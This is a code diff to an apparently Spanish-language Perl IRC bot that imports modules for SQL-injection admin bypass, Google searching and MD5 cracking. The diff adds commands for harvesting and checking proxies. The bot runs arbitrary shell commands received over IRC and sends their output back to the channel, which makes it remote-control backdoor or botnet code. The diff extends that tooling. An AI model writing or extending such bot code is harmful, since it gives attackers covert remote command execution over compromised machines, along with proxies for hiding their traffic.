@@ -11,6 +11,7 @@ use mod_GetTitle;
 use mod_SQLiAdmBypass;
 use mod_Google;
 use mod_MD5d;
+use mod_Proxy;
 use strict;
 use warnings;
 
@@ -164,16 +165,32 @@ while (<$sock>) {
 						return;
 					}
 						   my @resp=`$hash[1] 2>&1 3>&1`;
-						   foreach my $linha (@resp) {
-							chop $linha;
-							print $linha;
-						$sock->print("PRIVMSG $dcpto :$linha\n\r");
+						   foreach my $linea (@resp) {
+							chop $linea;
+							print $linea;
+						$sock->print("PRIVMSG $dcpto :$linea\n\r");
 					}
 				}
 				## exit
 				if($dssge =~ /\*exit/){
 					$sock->print("PRIVMSG $dcpto :Matando proceso $$ ... adios!\n\r");
 					`kill -9 $$`;
+				}
+				## get proxy
+				if($dssge =~ /\*pget\s(.*?)$/){
+					my $type = $1;
+					my @arr = mod_Proxy::get($type);
+					foreach my $proxy (@arr){
+						$sock->print("PRIVMSG $dcpto :$proxy\n\r");
+					}
+				}
+				## check proxy
+				if($dssge =~ /\*pchk\s(.*?)$/){
+					my $type = $1;
+					my @arr = mod_Proxy::check($type);
+					foreach my $proxy (@arr){
+						$sock->print("PRIVMSG $dcpto :$proxy\n\r");
+					}
 				}
 			}
 		}
